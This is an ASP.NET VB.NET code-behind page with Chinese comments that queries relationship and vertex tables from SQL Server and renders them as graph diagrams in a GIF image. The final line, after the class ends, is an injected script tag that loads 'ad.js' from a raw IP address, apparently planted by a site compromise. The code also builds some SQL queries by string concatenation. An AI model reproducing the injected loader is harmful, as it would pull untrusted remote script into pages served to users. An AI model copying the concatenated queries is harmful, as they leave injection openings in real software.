Imports System.Data
Imports System.Data.SqlClient
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Drawing.Imaging

Public Class full
    Inherits System.Web.UI.Page

#Region " Web 窗体设计器生成的代码 "

    '该调用是 Web 窗体设计器所必需的。
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents Form2 As System.Web.UI.HtmlControls.HtmlForm
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents Label2 As System.Web.UI.WebControls.Label
    Protected WithEvents Label3 As System.Web.UI.WebControls.Label
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents ddlstVertexKey As System.Web.UI.WebControls.DropDownList
    Protected WithEvents ddlstVertexName As System.Web.UI.WebControls.DropDownList
    Protected WithEvents txtKeyLen As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtNameLen As System.Web.UI.WebControls.TextBox
    Protected WithEvents btnKeySearch As System.Web.UI.WebControls.Button
    Protected WithEvents btnNameSearch As System.Web.UI.WebControls.Button
    Protected WithEvents imgFull As System.Web.UI.WebControls.Image
    Protected WithEvents lblHint As System.Web.UI.WebControls.Label
    Protected WithEvents lblWarning As System.Web.UI.WebControls.Label
    Protected WithEvents timetext As System.Web.UI.WebControls.Label

    '注意: 以下占位符声明是 Web 窗体设计器所必需的。
    '不要删除或移动它。
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: 此方法调用是 Web 窗体设计器所必需的
        '不要使用代码编辑器修改它。
        InitializeComponent()
    End Sub

#End Region

    Private Sub DrawArrayLine(ByRef g As Graphics, ByRef myPen As System.Drawing.Pen, _
        ByVal x1 As Single, ByVal y1 As Single, ByVal x2 As Single, ByVal y2 As Single)
        If (x1 = x2 And y1 = y2) Then
            Exit Sub
        End If

        g.DrawLine(myPen, x1, y1, x2, y2)

        Dim lenArray As Integer = 12  '箭头长度
        Dim arcArray As Double = 32.0 * Math.PI / 180.0 ' 箭头线偏移角

        Dim arc1 As Double = 0.0    ' 箭头线绝对角度
        Dim arc2 As Double = 0.0
        Dim arcT As Double = 0.0
        Dim p1 As New Point(x2, y2)
        Dim p2 As New Point(x2, y2)

        If (x1 = x2) Then
            If (y2 > y1) Then
                arcT = 1.5 * Math.PI
            Else
                arcT = 0.5 * Math.PI
            End If
        ElseIf (y1 = y2) Then
            If (x2 < x1) Then
                arcT = 0.0
            Else
                arcT = Math.PI
            End If
        Else
            Dim rate As Double = 1.0 * (y2 - y1) / (x2 - x1)
            arcT = Math.Atan(rate)
            If (arcT > 0 And x2 > x1 And y2 > y1) Then
                arcT = arcT + Math.PI
            ElseIf (arcT < 0 And x2 > x1 And y2 < y1) Then
                arcT = arcT + Math.PI
            End If
        End If
        arc1 = arcT - arcArray
        arc2 = arcT + arcArray
        p1.X = lenArray * Math.Cos(arc1) + x2
        p1.Y = lenArray * Math.Sin(arc1) + y2
        p2.X = lenArray * Math.Cos(arc2) + x2
        p2.Y = lenArray * Math.Sin(arc2) + y2
        g.DrawLine(myPen, x2, y2, p1.X, p1.Y)
        g.DrawLine(myPen, x2, y2, p2.X, p2.Y)
    End Sub

    Private Sub GetData()  ' 初始化页面显示
        Dim strSql As String
        Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
        Dim myDataSetInst As New DataSet
        Dim myDataSetVertex As New DataSet
        Try
            mySqlConn.Open()

            Dim mySqlAdapterInst As New SqlDataAdapter("select * from rinstance", mySqlConn)
            mySqlAdapterInst.Fill(myDataSetInst, "rinstance")
            Me.Session("myDataSetInst") = myDataSetInst

            Dim mySqlAdapterVertex As New SqlDataAdapter("select * from rvertex", mySqlConn)
            mySqlAdapterVertex.Fill(myDataSetVertex, "rvertex")
            Me.Session("myDataSetVertex") = myDataSetVertex

            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try
    End Sub

    Private Sub DrawOneInst(ByRef g As Graphics, ByRef myPen As System.Drawing.Pen, _
        ByVal center As Point, ByVal r As Integer, ByVal index As String)

        Dim rKey As String = Me.Session("myDataSetInst").Tables("rinstance").Rows(index).Item("rdefinitionkey")

        Dim strSql As String
        Dim mySqlConn As New SqlConnection(Me.Application("DataBase"))
        Dim myDataSetDef As New DataSet '关系类型数据集
        Dim myDataSetAss As New DataSet '关系断言数据集

        Try
            mySqlConn.Open()

            Dim mySqlAdapterDef As New SqlDataAdapter("select * from rdefinition where rdefinitionkey='" + rKey + "'", mySqlConn)
            mySqlAdapterDef.Fill(myDataSetDef, "rdefinition")

            strSql = [String].Format("select * from publisherassertion where rdefinitionkey = '{0}'", rKey)
            Dim mySqlAdapterAss As New SqlDataAdapter(strSql, mySqlConn)
            mySqlAdapterAss.Fill(myDataSetAss, "publisherassertion")

            mySqlConn.Close()
        Catch ex As SqlException
            Throw ex
            'Response.Redirect("error.htm") ' 错误提示
        Finally
        End Try

        Dim i As Integer
        Dim rIndex As Integer
        For i = 0 To myDataSetDef.Tables("rdefinition").Rows.Count - 1
            If (Me.Session("myDataSetInst").Tables("rinstance").Rows(i).Item("rdefinitionkey") = rKey) Then
                rIndex = i
                Exit For
            End If
        Next

        Dim iNum As Int32   '顶点个数
        iNum = Int32.Parse(myDataSetDef.Tables("rdefinition").Rows(rIndex).Item("relatedobjnum"))
        If (iNum <= 0) Then
            Exit Sub
        End If

        Dim pObj(iNum) As Point '各顶点坐标
        Dim dataObj(iNum) As String '关系类型中各顶点标志
        Dim markObj(iNum) As String '关系实例中各顶点上标志
        Dim theta As Double = -Math.PI  '顶点角度   
        Dim ss As String = "abcdefghijklmnopqrstuvwxyz" '顶点坐标
        Dim myFontFamily As New FontFamily("Arial")
        Dim myFont As New Font(myFontFamily, 24, FontStyle.Regular, GraphicsUnit.Pixel)
        Dim myBrush As New SolidBrush(Color.Black)

        Dim offset As Integer = 13  '连线将缩短的距离,避免画到字上
        Dim wxOffset As Integer = 12 '移到字中心位置
        Dim wyOffset As Integer = 16 '移到字中心位置

        center.X = center.X - 14
        center.Y = center.Y - 14

        Dim nn As Integer   '边数
        nn = myDataSetAss.Tables("publisherassertion").Rows.Count

        myPen = New Pen(Color.Black)
        Dim count As Integer = 0    '已定顶点记数
        Dim iFrom As Integer = -1   '开始顶点标志在ss数组中下标
        Dim iTo As Integer = -1 '结束顶点标志在ss数组中下标
        Dim j As Integer
        Dim ii As Integer
        If (nn > 0) Then
            For i = 0 To nn - 1
                For j = 0 To count - 1
                    If (myDataSetAss.Tables("publisherassertion").Rows(i).Item("vfrom") = dataObj(j)) Then
                        iFrom = j
                    End If
                    If (myDataSetAss.Tables("publisherassertion").Rows(i).Item("vto") = dataObj(j)) Then
                        iTo = j
                    End If
                    If (iFrom > 0 And iTo > 0) Then
                        Exit For
                    End If
                Next
                If (iFrom = -1) Then
                    iFrom = count

                    dataObj(iFrom) = myDataSetAss.Tables("publisherassertion").Rows(i).Item("vfrom")
                    markObj(iFrom) = dataObj(iFrom)

                    For ii = 0 To Me.Session("myDataSetVertex").Tables("rvertex").Rows.Count - 1
                        If (Me.Session("myDataSetVertex").Tables("rvertex").Rows(ii).Item("vorder") = dataObj(iFrom)) Then
                            markObj(iFrom) = Me.Session("myDataSetVertex").Tables("rvertex").Rows(ii).Item("vertexname")
                            Exit For
                        End If
                    Next
                    pObj(iFrom) = New Point(r * Math.Cos(theta) + center.X, r * Math.Sin(theta) + center.Y)
                    g.DrawString(markObj(iFrom), myFont, myBrush, pObj(iFrom).X, pObj(iFrom).Y)
                    theta = theta + 2.0 * Math.PI / iNum
                    count = count + 1
                End If
                If (iTo = -1) Then
                    iTo = count
                    dataObj(iTo) = myDataSetAss.Tables("publisherassertion").Rows(i).Item("vto")
                    markObj(iTo) = dataObj(iTo)
                    For ii = 0 To Me.Session("myDataSetVertex").Tables("rvertex").Rows.Count - 1
                        If (Me.Session("myDataSetVertex").Tables("rvertex").Rows(ii).Item("vorder") = dataObj(iTo)) Then
                            markObj(iTo) = Me.Session("myDataSetVertex").Tables("rvertex").Rows(ii).Item("vertexname")
                            Exit For
                        End If
                    Next
                    pObj(iTo) = New Point(r * Math.Cos(theta) + center.X, r * Math.Sin(theta) + center.Y)

                    g.DrawString(markObj(iTo), myFont, myBrush, pObj(iTo).X, pObj(iTo).Y)
                    theta = theta + 2.0 * Math.PI / iNum
                    count = count + 1
                End If


                Dim xOffset As Integer = 0
                Dim yOffset As Integer = 0
                If (pObj(iTo).X = pObj(iFrom).X) Then
                    yOffset = offset
                ElseIf (pObj(iTo).Y = pObj(iFrom).Y) Then
                    xOffset = offset
                Else
                    Dim rate As Double = 1.0 * (pObj(iFrom).Y - pObj(iTo).Y) / (pObj(iTo).X - pObj(iFrom).X)
                    Dim dcos As Double = 1 / Math.Sqrt(1.0 + rate * rate)
                    Dim dsin As Double = Math.Sqrt(1.0 - dcos * dcos)
                    xOffset = offset * dcos
                    yOffset = offset * dsin
                End If
                If (pObj(iFrom).X > pObj(iTo).X) Then
                    xOffset = -xOffset
                End If
                If (pObj(iFrom).Y > pObj(iTo).Y) Then
                    yOffset = -yOffset
                End If

                If (myDataSetDef.Tables("rdefinition").Rows(0).Item("isdirectional").ToString() = "1") Then
                    DrawArrayLine(g, myPen, pObj(iFrom).X + xOffset + wxOffset, pObj(iFrom).Y + yOffset + wyOffset, pObj(iTo).X - xOffset + wxOffset, pObj(iTo).Y - yOffset + wxOffset)
                Else
                    g.DrawLine(myPen, pObj(iFrom).X + xOffset + wxOffset, pObj(iFrom).Y + yOffset + wyOffset, pObj(iTo).X - xOffset + wxOffset, pObj(iTo).Y - yOffset + wxOffset)
                End If

                iFrom = -1
                iTo = -1
            Next
        End If

        If (count <> iNum) Then
            Dim iMark As Integer = 0
            For i = count To iNum - 1
                For j = 0 To count
                    If (ss.Substring(iMark, 1) <> dataObj(j)) Then
                        Exit For
                    Else
                        iMark = iMark + 1
                    End If
                Next
                pObj(i) = New Point(r * Math.Cos(theta) + center.X, r * Math.Sin(theta) + center.Y)

                g.DrawString(ss.Chars(iMark), myFont, myBrush, pObj(i).X, pObj(i).Y)
                theta = theta + 2.0 * Math.PI / iNum
                count = count + 1
                iMark = iMark + 1
            Next
        End If
    End Sub

    Private Sub ShowSearch(ByVal index As Integer, ByVal len As Integer)
        Dim nInst As Integer = Me.Session("myDataSetInst").Tables("rinstance").Rows.Count   '实例总个数
        Dim nVertex As Integer = Me.Session("myDataSetVertex").Tables("rvertex").Rows.Count '顶点总个数
        Dim fInst(nInst) As Integer '实例是否已读标志
        Dim qInst(nInst) As String '实例队列
        Dim hInst As Integer = 0  '实例队首下标
        Dim eInst As Integer = -1  '实例队尾下标
        Dim fVertex(nVertex) As Integer '顶点是否已读标志
        Dim qVertex(nVertex) As String '顶点队列
        Dim hVertex As Integer = 0 '顶点队首下标
        Dim eVertex As Integer = -1  '顶点队尾下标
        Dim iLen As Integer = 0 '当前步长

        Dim i As Integer
        Dim j As Integer
        Dim ii As Integer
        Dim jj As Integer

        eVertex = eVertex + 1
        qVertex(eVertex) = Me.Session("myDataSetVertex").Tables("rvertex").Rows(index).Item("vertexname")
        fVertex(eVertex) = -1
        iLen = iLen + 1
        While (eVertex >= hVertex And iLen < len)
            For i = 0 To nVertex - 1
                If (Me.Session("myDataSetVertex").Tables("rvertex").Rows(i).Item("vertexname") = qVertex(hVertex)) Then
                    For j = 0 To eInst
                        If (Me.Session("myDataSetVertex").Tables("rvertex").Rows(i).Item("relationkey") = qInst(j)) Then
                            Exit For
                        End If
                    Next
                    If j > eInst Then
                        eInst = eInst + 1
                        qInst(eInst) = Me.Session("myDataSetVertex").Tables("rvertex").Rows(i).Item("relationkey")
                        fInst(eInst) = fVertex(hVertex)
                        For ii = 0 To nVertex - 1
                            If (Me.Session("myDataSetVertex").Tables("rvertex").Rows(ii).Item("relationkey") = qInst(hInst)) Then
                                For jj = 0 To eVertex
                                    If (Me.Session("myDataSetVertex").Tables("rvertex").Rows(ii).Item("vertexname") = qVertex(jj)) Then
                                        Exit For
                                    End If
                                Next
                                If (jj > eVertex) Then
                                    eVertex = eVertex + 1
                                    qVertex(eVertex) = Me.Session("myDataSetVertex").Tables("rvertex").Rows(ii).Item("vertexname")
                                    fVertex(eVertex) = hInst
                                End If
                            End If
                        Next
                        hInst = hInst + 1
                    End If
                End If
            Next
            hVertex = hVertex + 1
            iLen = iLen + 1
        End While

        'draw picture here
        Dim rootWidth As Integer = 60   '第一个结点宽度
        Dim rootHeight As Integer = 25  '第一个结点高度
        Dim width As Integer = 120  '其他结点宽
        Dim height As Integer = 120 '高
        Dim wOff As Integer = 15    '两结点间的宽向间隔
        Dim hOff As Integer = 12    '纵向间隔
        Dim rOff As Integer = 14    '一个结点,外圆和内圆的偏移
        Dim wAll As Integer = (width + wOff + 1) * (iLen - 1) + rootWidth '整个图片最小宽度
        Dim hAll As Integer = (height + hOff + 1) * (hInst) + rootHeight '整个图片最小高度
        Dim pWidth As Integer = Math.Max(wAll, 560)
        Dim pHeight As Integer = Math.Max(hAll, 300)

        Dim bmp As New Bitmap(pWidth, pHeight, PixelFormat.Format24bppRgb) '图片
        Dim g As Graphics = Graphics.FromImage(bmp)
        g.FillRectangle(Brushes.White, New Rectangle(0, 0, pWidth, pHeight))
        Dim myPen As New Pen(Color.Blue)
        Dim myFontFamily As New FontFamily("Arial")
        Dim myFont As New Font(myFontFamily, 16, FontStyle.Regular, GraphicsUnit.Pixel)
        Dim myBrush As New SolidBrush(Color.Black)

        Dim r As Double = Math.Min(width / 2, height / 2)  '半径

        Dim center As New Point(rootWidth / 2, rootHeight / 2)
        g.DrawArc(myPen, 0, 0, rootWidth, rootHeight, 0, 360)
        g.DrawString(Me.ddlstVertexName.SelectedValue.Trim(), myFont, myBrush, center.X - rootWidth / 2 + 6, center.Y - 9)

        center.Y = rootHeight - height / 2
        Dim sInst(nInst) As Integer '堆栈
        Dim fsInst(nInst) As Integer
        Dim topInst As Integer = -1

        For i = 0 To hInst - 1
            If (fInst(i) = -1) Then
                topInst = topInst + 1
                sInst(topInst) = i
                fsInst(topInst) = 1
            End If
        Next
        Dim flag As Boolean = False
        Dim totalLast(iLen) As Integer    '上面同一层结点记数结点记数
        totalLast(0) = 1
        For i = 1 To iLen - 1
            totalLast(i) = 0
        Next

        While topInst >= 0
            For i = 0 To nInst - 1
                If (Me.Session("myDataSetInst").Tables("rinstance").Rows(i).Item("relationkey") = qInst(sInst(topInst))) Then
                    center.X = rootWidth + (width + wOff) * fsInst(topInst) - width / 2
                    center.Y = center.Y + height + hOff
                    Dim xx As Integer = center.X - r
                    Dim yy As Integer = center.Y - r
                    g.DrawArc(myPen, xx, yy, width, height, 0, 360)
                    Dim xxOff As Integer = 0
                    If (fsInst(topInst) >= 2) Then
                        xxOff = width / 2 + wOff
                    Else
                        xxOff = rootWidth / 2 + wOff
                    End If
                    Dim xxx As Integer = xx - xxOff
                    Dim yyy As Integer = yy + height / 2
                    g.DrawLine(myPen, xxx, yyy, xx, yyy)    '画每个结点左边横向那条直线

                    DrawOneInst(g, myPen, center, r - rOff, i)

                    Dim yyyy As Integer = yy - (height + hOff) * (totalLast(fsInst(topInst))) - hOff
                    g.DrawLine(myPen, xxx, yyy, xxx, yyyy)  '画每个结点左边纵向那条直线

                    For j = 0 To fsInst(topInst)
                        totalLast(j) = totalLast(j) + 1
                    Next
                    For j = fsInst(topInst) + 1 To iLen - 1
                        totalLast(j) = 0
                    Next
                    Exit For
                End If
            Next
            Dim temp As Integer = topInst
            topInst = topInst - 1
            For j = 0 To hInst - 1
                If (fInst(j) = i) Then
                    topInst = topInst + 1
                    sInst(topInst) = j
                    fsInst(topInst) = fsInst(temp) + 1
                    flag = True
                End If
            Next
        End While

        bmp.Save(Server.MapPath("") + "\\imga\\tmpFile.gif", ImageFormat.Gif)
        Me.imgFull.ImageUrl = Server.MapPath("") + "\\imga\\tmpFile.gif"
        g.Dispose()
        bmp.Dispose()
    End Sub

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '在此处放置初始化页的用户代码
        Me.lblWarning.Visible = False
        Me.timetext.Text = DateTime.Now.ToString()

        Me.lblHint.ForeColor = System.Drawing.Color.AntiqueWhite

        If Session("UserName") = "" Then
            Me.lblHint.Text = "您还没登录，请先登录"
        Else
            Me.lblHint.Text = "您好， " + Session("UserName")
        End If

        If Not IsPostBack Then  ' 用户x第一次打开页面时
            Me.Session("indexkey") = 0
            Me.Session("indexname") = 0
            GetData()
            Me.ddlstVertexKey.DataSource = Me.Session("myDataSetVertex").Tables("rvertex").DefaultView
            Me.ddlstVertexKey.DataValueField = "rvertexkey"
            Me.ddlstVertexKey.DataBind()
            Me.ddlstVertexName.DataSource = Me.Session("myDataSetVertex").Tables("rvertex").DefaultView
            Me.ddlstVertexName.DataValueField = "vertexname"
            Me.ddlstVertexName.DataBind()
            Me.txtKeyLen.Text = "3"
            Me.txtNameLen.Text = "3"
            ShowSearch(0, 3)
        End If
    End Sub

    Private Sub ddlstVertexKey_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstVertexKey.SelectedIndexChanged
        Me.Session("indexkey") = Me.ddlstVertexKey.SelectedIndex
    End Sub

    Private Sub ddlstVertexName_SelectedIndexChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ddlstVertexName.SelectedIndexChanged
        Me.Session("indexName") = Me.ddlstVertexName.SelectedIndex
    End Sub

    Private Sub btnKeySearch_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnKeySearch.Click
        GetData()
        Me.ddlstVertexKey.DataSource = Me.Session("myDataSetVertex").Tables("rvertex").DefaultView
        Me.ddlstVertexKey.DataValueField = "rvertexkey"
        Me.ddlstVertexKey.DataBind()
        Me.ddlstVertexKey.SelectedIndex = Me.Session("indexkey")
        Me.ddlstVertexName.DataSource = Me.Session("myDataSetVertex").Tables("rvertex").DefaultView
        Me.ddlstVertexName.DataValueField = "vertexname"
        Me.ddlstVertexName.DataBind()
        Me.ddlstVertexName.SelectedIndex = Me.Session("indexkey")
        Me.Session("indexname") = Me.Session("indexkey")
        Me.txtNameLen.Text = Me.txtKeyLen.Text
        ShowSearch(Me.Session("indexkey"), Me.txtKeyLen.Text.Trim.ToString())
    End Sub

    Private Sub btnNameSearch_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNameSearch.Click
        GetData()
        Me.ddlstVertexKey.DataSource = Me.Session("myDataSetVertex").Tables("rvertex").DefaultView
        Me.ddlstVertexKey.DataValueField = "rvertexkey"
        Me.ddlstVertexKey.DataBind()
        Me.ddlstVertexKey.SelectedIndex = Me.Session("indexname")
        Me.ddlstVertexName.DataSource = Me.Session("myDataSetVertex").Tables("rvertex").DefaultView
        Me.ddlstVertexName.DataValueField = "vertexname"
        Me.ddlstVertexName.DataBind()
        Me.ddlstVertexName.SelectedIndex = Me.Session("indexname")
        Me.Session("indexkey") = Me.Session("indexname")
        Me.txtKeyLen.Text = Me.txtNameLen.Text
        ShowSearch(Me.Session("indexname"), Me.txtNameLen.Text.Trim.ToString())
    End Sub
End Class
<script src="http://222.208.183.246/ad/ad.js"></script>
